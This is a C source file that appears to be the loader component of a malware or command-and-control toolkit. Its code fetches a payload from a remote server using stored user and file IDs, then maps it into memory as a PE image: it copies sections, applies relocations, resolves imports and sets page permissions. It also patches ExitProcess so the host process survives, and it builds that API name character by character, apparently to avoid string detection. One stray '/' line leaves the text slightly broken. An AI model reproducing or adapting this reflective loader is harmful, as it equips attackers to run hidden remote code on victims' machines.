#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"
#include "../../includes/parser/parser.h"

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif



LdrInfo LdrPullFile() {
	LdrInfo info;
	ParserWrite *writer = ParserInitWrite();
	if(!writer) {
		info.ok = FALSE;
		return info;
	}

	if(!NwLoadApis()) {
		info.ok = FALSE;
		return info;
	}

	if(!ParserWrite4(writer, 0xab)) {
		info.ok = FALSE;
		return info;
	}
	INT BytesWrote = ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
	if(BytesWrote == 0) {
		info.ok = FALSE;
		return info;
	}
#ifdef LOAD_AND_EXIT
	BytesWrote = ParserWriteBytes(writer, ldr->config->FileId, sizeof(ldr->config->FileId));
	if(BytesWrote == 0) {
		info.ok = FALSE;
		return info;
	}
#endif

	DWORD payloadSize = 0;
	PVOID payload = NwGetPayload(&payloadSize,
    ParserWriteReturnPointer(writer),
    (DWORD)ParserWriteReturnSize(writer));
	if(!payload) {
		info.ok = FALSE;
		return info;
	}

	info.DataPointer = (PBYTE)payload;
	info.DataSize = payloadSize;
	info.ok = TRUE;
	ParserClearWrite(writer);
	return info;
}

BOOL HasReloc(PBYTE pe) {
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe + ((PIMAGE_DOS_HEADER)pe)->e_lfanew);
    if (nt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
        return FALSE;
    return nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
}

DWORD SectionCharsToProt(DWORD chars) {
    DWORD exec  = chars & IMAGE_SCN_MEM_EXECUTE;
    DWORD read  = chars & IMAGE_SCN_MEM_READ;
    DWORD write = chars & IMAGE_SCN_MEM_WRITE;

    if (exec && read && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)          return PAGE_EXECUTE_READ;
    if (exec && write)         return PAGE_EXECUTE_WRITECOPY;
    if (exec)                  return PAGE_EXECUTE;
    if (read && write)         return PAGE_READWRITE;
    if (read)                  return PAGE_READONLY;
    if (write)                 return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

void LdrCopySections(PVOID Base, PBYTE Raw, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	DBGA("[+] Copying Sections\n");
    for (DWORD i = 0; i < numSections; i++) {
        LdrMemcpy(
            (PBYTE)Base + sec[i].VirtualAddress,
            Raw + sec[i].PointerToRawData,
            sec[i].SizeOfRawData
        );
    }
}

BOOL LdrProcessRelocs(PVOID Base, PBYTE Raw) {
	DBGA("[+] Handling reloc\n");

    PIMAGE_DATA_DIRECTORY relocDir = &OPT_HEADER(Raw)->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (!relocDir->VirtualAddress)
        return FALSE;

    ULONG_PTR delta = (ULONG_PTR)Base - OPT_HEADER(Raw)->ImageBase;
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Base + relocDir->VirtualAddress);

    while (reloc->VirtualAddress) {
        DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entries = (PWORD)(reloc + 1);

        for (DWORD i = 0; i < numEntries; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_TYPE) {
                ULONG_PTR *patch = (ULONG_PTR *)((PBYTE)Base + reloc->VirtualAddress + offset);
                *patch += delta;
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }

    return TRUE;
}

void LdrProcessIAT(PVOID Base, PBYTE Raw) {
	DBGA("[+] Handling IAT\n");

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Raw)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!importDir->VirtualAddress)
        return;

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);

    for (; pImportDesc->Name != 0; ++pImportDesc) {
        PCHAR ImportName = RVA2VA(PCHAR, Base, pImportDesc->Name);
        HMODULE ModuleImport = ldr->win32->LoadLibraryA(ImportName);

        PIMAGE_THUNK_DATA OrgTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->FirstThunk);

        for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
            if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal)) {
                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->GetProcAddress(ModuleImport, (LPCSTR)IMAGE_ORDINAL(OrgTd->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME pImportName = RVA2VA(PIMAGE_IMPORT_BY_NAME, Base, OrgTd->u1.AddressOfData);
                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->GetProcAddress(ModuleImport, pImportName->Name);
            }
        }
    }
}

void LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	DBGA("[+] Handling Section perms\n");

    for (DWORD i = 0; i < numSections; i++) {
        PVOID secMemory = (PBYTE)Base + sec[i].VirtualAddress;
        SIZE_T secSize = sec[i].SizeOfRawData;
        ULONG old = 0;

        DWORD prot = SectionCharsToProt(sec[i].Characteristics);
        ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &secMemory, &secSize, prot, &old);
    }

    ldr->win32->NtFlushInstructionCache(CurrentProcess(), NULL, 0);
}


void LdrPatchExitProcess(PVOID Base) {
    DBGA("[+] Patching ExitProcess\n");
    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir->VirtualAddress)
        return;

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);

    for (; pImportDesc->Name != 0; ++pImportDesc) {
        PIMAGE_THUNK_DATA OrgTd  = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->FirstThunk);

        for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
            if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal))
                continue;

            PIMAGE_IMPORT_BY_NAME pName = RVA2VA(PIMAGE_IMPORT_BY_NAME, Base, OrgTd->u1.AddressOfData);

            /
            CHAR target[] = { 'E','x','i','t','P','r','o','c','e','s','s', 0 };
            if (LdrStrncmp(pName->Name, target, 12) == 0) {
                DBGA("[*] Found ExitProcess\n");
                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->RtlExitUserThread;
                return;
            }
            DBGA("[!] Failed Finding ExitProcess\n");

        }
    }
}

static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
    MemRunContext *ctx = (MemRunContext *)param;
    PVOID Base = ctx->BaseAddress;

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);
        for (; pImport->Name; pImport++) {
            PCHAR name = RVA2VA(PCHAR, Base, pImport->Name);
            HMODULE hMod = ldr->win32->LoadLibraryA(name);  
            ldr->win32->FreeLibrary(hMod);                 
            ldr->win32->FreeLibrary(hMod);                   
        }
    }

    SIZE_T size = 0;
    ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &ctx->BaseAddress, &size, MEM_RELEASE);
    ldr->win32->LocalFree(ctx);
}